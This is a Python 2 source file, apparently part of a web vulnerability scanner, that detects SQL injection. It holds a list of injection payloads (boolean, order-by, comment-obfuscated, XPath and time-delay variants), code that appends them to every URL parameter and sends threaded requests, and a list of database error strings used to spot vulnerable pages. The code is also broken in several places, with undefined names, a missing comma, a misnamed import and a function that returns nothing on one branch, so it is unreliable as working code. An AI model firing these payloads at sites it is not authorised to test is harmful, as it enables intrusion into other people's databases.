#!/usr/bin/env python
#coding=utf-8
"""
for help http://www.yzqy.cc
此模块为sql注入检测处理模块
"""

import request
import time
import threading

class Sqlinject(object):
	"""此类主要检测注入点"""	
	payload = [	
			"'",
			"2 and 456=678",
			"2 or 345=345",
			"2 order by 9999",
			"2 order by 1",
			"2/0 and 456=678",
			"2/1 or 345=345",
			"2/*f*/and/*f*/456=678",
			"2/*f*/or/*f*/345=345",
			"%27",
			"a' aNd '456'='678",
			"a' oR '345'='345",
			"a' aNd 'fghi'='fghj'-- #",
			"a' Or 'dfth'='dfth'-- #",
			"a' oRdEr by 9999-- #",
			"a' orDeR by 1-- #",
			"a'aNd/*g*/456=678-- #",
			"a'Or/*g*/345=345-- #",
			"345'%5d|//*|/a%5b'a",
			"456'%5d|//a|/a%5b'a",
			"345')%5d|//*|/a%5bcontaiNs(a,'b",
			"456')%5d|//a|/a%5bcontAins(a,'b",
			"a'||/**/456=678#",
			"1/*f*/oR/*f*/888/*f*/lIke/*f*/456",
			"345'||'1",
			"a'or%0a345%0alIKe%0a345-- #",
			"1 waitfor delay '0:0:X'--",
			"1; waitfor delay '0:0:X'--",
			"1'; waitfor delay '0:0:X'--"
		]
	error_ban = [
			"ORA",
			"Unclosed.quotation",
			"SQL.syntax",
			"Active.Server",
			"Microsoft Access",
			"database error",
			"ADODB.Field",
			"An.illegal",
			"An.unexpected",
			"ASP.NET.is.configured.to.show.verbose.error.messages",
			"ASP.NET_SessionId",
			"A.syntax",
			"Can't.connect",
			"CLI.Driver",
			"Custom.Error",
			"data.source",
			"DB2.Driver",
			"DB2.Error",
			"DB2.ODBC",
			"detected.an",
			"Died.at",
			"Disallowed.Parent",
			"Error.converting",
			"Error.Diagnostic",
			"Error.Message",
			"Error.Report",
			"Fatal.error",
			"include_path",
			"Incorrect.syntax"
			"Index.of",
			"Internal.Server",
			"Invalid.Path",
			"Invalid.procedure",
			"invalid.query",
			"Invision.Power",
			"is.not.allowed.to.access",
			"JDBC.Driver",
			"JDBC.Error",
			"JDBC.MySQL",
			"JDBC.Oracle",
			"JDBC.SQL",
			"Microsoft.OLE",
			"Microsoft.VBScript",
			"missing.expression",
			"MySQL.Driver",
			"mysql.erro",
			"mySQL.error",
			"MySQL.Error",
			"MySQL.ODBC",
			"ODBC.DB2",
			"ODBC.Driver",
			"ODBC.Error",
			"ODBC.Microsoft",
			"ODBC.Oracle",
			"ODBC.SQL",
			"OLE/DB.provider",
			"on.MySQL",
			"ORA-0",
			"ORA-1",
			"Oracle.DB2",
			"Oracle.Driver",
			"Oracle.Error",
			"Oracle.ODBC",
			"Parent.Directory",
			"Permission.denied",
			"PHP.Error",
			"PHP.Parse",
			"PHP.Warning",
			"PostgreSQL.query",
			"server.at",
			"server.object",
			"SQL.command",
			"SQLException",
			"SQL.Server",
			"supplied.argument",
			"Supplied.argument",
			"Syntax.error",
			"The.error.occurred.in",
			"The.script.whose.uid.is",
			"Type.mismatch",
			"Unable.to.jump.to.row",
			"Unclosed.quotation",
			"unexpected.end",
			"Unterminated.string",
			"Warning..Cannot",
			"Warning..mysql_query",
			"Warning..pg_connect",
			"Warning..Supplied",
			"You.have.an.error.in.your.SQL.syntax",
			"invalid.in.the.select.list.because",
			"数据库出错",
			"数据库错误"
			]
	def __init__(self, arg):
		super(Sqlinject, self).__init__()
		self.url = arg

	def urlsplit(self,url,payload):
		s=""
		if '&' not in url:
			s=url + "a ' --"
		else:
			url_split_1 = url.split('&')
			#将参数以&切片形成列表
			url_split_2 = map(lambda x:x +payload,url_split_1)
			#将列表中的每个参数都加上payload
			for i in url_split_2:
				s= s +"&" + i
				#再将参数合并成一个完整的url
			return s

	def httpthread(self,payurl,method,timeout):
		#此方法用于检测页面是否包含数据库错误信息,从而判断是否是注入点
		sqlquest = Myhttp()
		body,bodysize,status = sqlquest.opener(payurl,method,timeout)
		if status != 404:
			for i in error_ban:
				if i in bodysize:
					print  "[info] is true : " + row
		else:
			print "[info]error status : ",status
		return row

	def sqltest(self,url,method,timeout,thread):
		#多线程操作方法
		for x in payload:
			payurl = urlsplit(url,x)
			while  threading.active_count() < thread:
				test=threading.Thread(target=httpthread,args=([payurl,method,timeout,]))
				test.start()
				test.join()


